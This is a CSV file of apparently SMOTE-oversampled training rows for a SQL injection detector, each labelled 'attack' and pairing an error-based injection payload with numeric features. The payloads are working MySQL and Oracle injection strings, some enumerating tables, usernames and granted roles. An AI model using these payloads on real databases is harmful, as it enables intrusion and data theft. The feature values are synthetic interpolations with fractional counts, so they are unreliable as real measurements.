id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001192,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,0.9510546960681633,234.8364981912033,31.35493486125203,3.778848133780488,78.41973944500812,37.0,92.19143305245534,27.225325693739848,0.33508391927449155,0.15791338509026334,0.39129944655118437,0.11570324908406074,4.0,0.0,0.0,0.0,0.0,1.6450651387479698,0.0,16.58026055499188,0.0,0.0,5.0,1.6450651387479693,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001193,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000030,1.0066707380048612,293.98804592156824,40.174701148039205,4.029868773645603,107.52410344411763,46.49402296078413,105.7952183686273,34.174701148039205,0.36645778617624003,0.15730906685332405,0.3597636516305395,0.11646949533989634,0.0,1.0,2.0,0.0,2.0,2.0,0.0,19.349402296078413,0.0,1.6505977039215871,5.1747011480392064,6.1747011480392064,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.5241034441176193,0.5241034441176193,1.0,1.8252988519607936,0.17470114803920644,0.8252988519607936,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.8252988519607934,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.698804592156826
SMOTE_001194,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000054,0.19517832901119161,220.8705198332513,32.062179988089376,3.9224305221706564,81.0,37.49743990471504,78.3108999404469,24.06217998808938,0.36681211914348566,0.1696819647476109,0.35455511732526646,0.10895079878363698,3.8756400238212416,0.0,0.0,0.0,0.0,1.0621799880893792,0.0,14.0,0.0,0.0,5.0,1.186539964268138,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0621799880893792,0.0,0.062179988089379135,0.0,0.9378200119106208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.06217998808938
SMOTE_001195,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000037,0.2492631822408504,312.8962975304504,37.89629753045039,4.028685965281695,109.8962975304504,55.0,113.0,35.0,0.3512221307311525,0.1757772552206237,0.36114236072600875,0.11185825332221508,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.8962975304503908,0.10370246954960916,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001196,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,0.34543817059127063,331.75051855931235,32.1247407203438,3.4423944351992137,80.87525927965619,49.37422216103141,145.5010371186248,56.0,0.24378234827986084,0.14883594695195437,0.4385794871643284,0.16880221760385639,0.0,0.0,0.12474072034380318,0.0,0.0,2.0,0.0,30.8752592796562,0.0,0.0,1.0,22.1247407203438,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.8752592796561969,0.12474072034380312,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001197,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,0.0716482700893804,196.9819419292666,32.06320324756676,3.9343084462621474,59.12640649513354,42.89165157559983,67.99097096463332,26.97291289389996,0.3001683588628029,0.21773869211075625,0.3451633275762757,0.1369296214501651,3.990970964633319,0.0,0.0,0.0,0.0,1.9909709646333191,0.0,12.009029035366682,0.0,0.0,4.99097096463332,5.972912893899958,1.0,0.0,0.0,0.009029035366680677,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.9909709646333194,0.0,1.0,1.0,-1.1102230246251565e-16,0.9909709646333192,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.009029035366680625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.99097096463332
SMOTE_001198,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,0.2813253752644394,198.16049273227543,28.305392824283004,3.4628136338351267,46.73294277827921,39.511371481147194,87.61078564856601,24.305392824283004,0.23564126390384318,0.19969262249706196,0.442079382991623,0.12258673060747184,0.0,0.24431425942640272,0.0,0.0,1.0,1.9389214351433992,0.0,16.1221571297132,0.0,0.0,4.0,2.938921435143399,0.0,0.06107856485660068,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001199,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R000070,1.8464260695231651,195.87460083476293,28.562699582618524,3.5040977807359677,48.81349791309262,37.18650208690738,84.7492016695259,25.12539916523705,0.24927834050449435,0.18978932390290865,0.4326305468247358,0.1283017887678612,2.2507983304740944,0.0,0.0,0.0,0.4373004173814763,1.4373004173814765,0.0,16.0,0.0,0.0,4.5626995826185235,1.874600834762953,0.5626995826185235,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.874600834762953,0.0,0.0,0.4373004173814764,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.311901252144429
SMOTE_001200,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,0.6251476690946766,345.0,34.0,3.7102614203820807,102.7601584493749,45.991873240500084,138.24796831012503,58.0,0.29785553173731855,0.13330977750869588,0.4007187487250001,0.1681159420289855,3.6280475348124686,0.0,0.24796831012502096,0.0,0.0,2.1239841550625105,0.0,28.0,0.0,3.0,0.0,22.37195246518753,1.0,0.0,0.12398415506251055,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.1239841550625104,1.0,1.8760158449374895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001201,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,1.2293749624887635,289.20302539724577,36.0,3.8499259914032105,98.38578458879044,40.84771278505393,115.31470753274269,34.65482049065871,0.3420124706096454,0.14120923951826816,0.3967223223855693,0.1200559674865171,0.26903590186825865,0.0,0.0,0.0,2.0,1.7309640981317411,0.0,22.385784588790447,0.0,2.0,5.269035901868259,3.730964098131741,0.26903590186825893,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.4619281962634827,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.461928196263482
SMOTE_001202,attack,error,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",nearest_attack_euclidean,R000015,0.16771106743843447,191.21063312496545,26.17294758928078,3.3624442281543683,39.51884276784235,42.61951530358228,85.76096939283545,23.311305660705408,0.20646468851500333,0.2234070335276519,0.44834340044483434,0.12178487751251045,0.13835807142462553,0.0,0.0,0.0,0.03458951785615638,2.0,0.0,16.138358071424626,0.0,0.0,4.965410482143843,2.0345895178561566,0.03458951785615638,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0691790357123125,0.0,0.0,0.03458951785615638,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.10376855356847
SMOTE_001203,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,1.1208139195545463,330.8094712605576,32.59526436972121,3.467041695749726,80.4047356302788,50.78579310916362,143.61894252111517,56.0,0.24305225499404343,0.15353431197950895,0.4341302127872292,0.16928322023921846,0.0,0.0,0.5952643697212069,0.0,0.0,2.0,0.0,30.404735630278793,0.0,0.0,1.0,22.595264369721207,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.404735630278793,0.5952643697212069,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001204,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,1.2642145693384188,210.34556269927316,35.24158934264947,3.6943675811885304,55.0,40.0,88.72476802794841,26.620794671324735,0.261543234685719,0.19021326158961377,0.4216903547180627,0.12655314900660453,0.3792053286752646,0.6207946713247354,2.0,0.0,1.0,2.0,0.0,15.620794671324735,0.0,0.0,4.0,5.0,0.3792053286752647,0.6207946713247354,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001205,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,1.940694561756778,336.6109011862783,34.16662962110793,3.5824561512108435,87.3886542670169,50.44449383852276,141.22224691926138,57.55550616147724,0.2590986273095216,0.15009096240525752,0.41986371072312234,0.17094669956209857,0.0,1.5555061614772425,1.0,0.0,0.0,2.3888765403693104,0.0,29.22224691926138,0.0,1.1666296211079317,0.6111234596306891,23.38887654036931,0.0,0.38887654036931063,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.38887654036931063,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.388876540369311
SMOTE_001206,attack,error,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",nearest_attack_euclidean,R000015,2.0081311328993863,204.4958237157145,28.070831959387785,3.365247659728264,45.21249587816336,38.44416968934687,94.11166062130626,26.727497526898013,0.21964999045469408,0.19148706014503353,0.459042584847075,0.1298203645531974,1.6566655675102282,0.0,0.0,0.0,0.4141663918775571,2.0,0.0,17.656665567510228,0.0,0.0,4.585833608122443,2.414166391877557,0.41416639187755705,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8283327837551142,0.0,0.0,0.41416639187755716,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.2424991756326715
SMOTE_001207,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,1.049630761048781,324.26820198803506,32.097697017947404,3.5625903375324826,88.63410099401753,46.097697017947404,134.53640397607012,55.0,0.27333377324239655,0.14217368365202504,0.4148783598175758,0.1696141832880026,0.0,0.0,0.36589900598246694,0.0,0.0,2.0,0.0,28.634100994017533,0.0,3.0,0.0,22.365899005982467,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6341009940175331,0.36589900598246694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001208,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000042,0.36402982103434955,326.0901485785333,40.0,4.025067457363029,109.0901485785333,63.0,119.0,35.0,0.3345393354865924,0.19319825743937638,0.3649300418299332,0.107332365244098,0.09014857853329561,0.9098514214667044,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.09014857853329583,0.9098514214667042,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.09014857853329561,0.9098514214667043,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001209,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,1.2569287092235044,265.2374550373425,36.0,4.024188142949934,103.09297482091179,35.0,94.1959856119496,32.9484946044811,0.3883245384002703,0.13223241980612982,0.3552116043598037,0.12423143743379615,2.948494604481099,0.0,0.0,0.0,2.0,1.6494982014936999,0.0,18.0,0.0,2.0,5.350501798506301,3.6494982014937003,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.2989964029873993,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.298996402987399
SMOTE_001210,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000021,0.9822058204456303,208.6704901740352,38.554918304327465,3.8187228303600715,63.0,37.0,85.6704901740352,23.0,0.3019728686351846,0.17734914507145763,0.41043392314083005,0.11024406315252772,0.5549183043274668,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,15.445081695672533,0.0,0.0,3.0,3.0,0.554918304327467,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_001211,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.09457688559930588,219.1355229455731,42.063084608087394,4.344792520196543,120.8831845132235,2.0,71.18925382426218,25.063084608087394,0.5514749597344137,0.009133297589194067,0.3249771582126971,0.1144145844636951,3.0,0.0,0.0,0.0,0.0,3.0315423040436964,0.0,10.0,0.0,6.031542304043697,1.0,3.031542304043697,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0315423040436962,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.031542304043697
SMOTE_001212,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.4897692039467437,214.72300691635127,40.689202766540504,4.243699920397063,118.03380414981075,2.0,71.0,23.689202766540504,0.5496965257073825,0.009315458202336618,0.33069876618294913,0.11028924990733188,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,4.6892027665405065,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001213,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,0.44386727383917984,248.79041880669445,35.790418806694454,4.0078004149108555,94.0,35.0,89.0,30.79041880669445,0.3778290684054074,0.14068103610839638,0.3577317775327794,0.12375811795341674,0.7904188066944515,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,18.0,0.0,2.0,6.0,3.0,0.7904188066944513,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
SMOTE_001214,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000064,0.5205203137229748,241.0,41.0,3.917938037863896,74.0,45.0,97.0,25.0,0.3070539419087137,0.18672199170124482,0.4024896265560166,0.1037344398340249,0.16003390505674298,0.8399660949432571,1.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.0,4.0,0.16003390505674298,0.839966094943257,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_001215,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,2.9200193199910854e-07,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,0.0,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_001216,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000032,0.9474106212746447,190.44253869146326,31.708061906341207,3.701819907870097,64.79656964463386,24.619554168048555,77.02641487878084,24.0,0.34016263849465006,0.12920632559606227,0.4046019111750129,0.12602912473427483,3.911492261707349,0.0,0.0,0.0,0.0,0.0885077382926509,0.0,15.734476785122048,0.0,0.0,4.0,0.26552321487795183,1.0,0.0,0.0,0.0885077382926507,0.0,0.08850773829265057,1.0,0.0,0.0,1.0,0.08850773829265066,0.0885077382926509,0.0,0.08850773829265068,0.08850773829265068,0.9114922617073493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.177015476585301
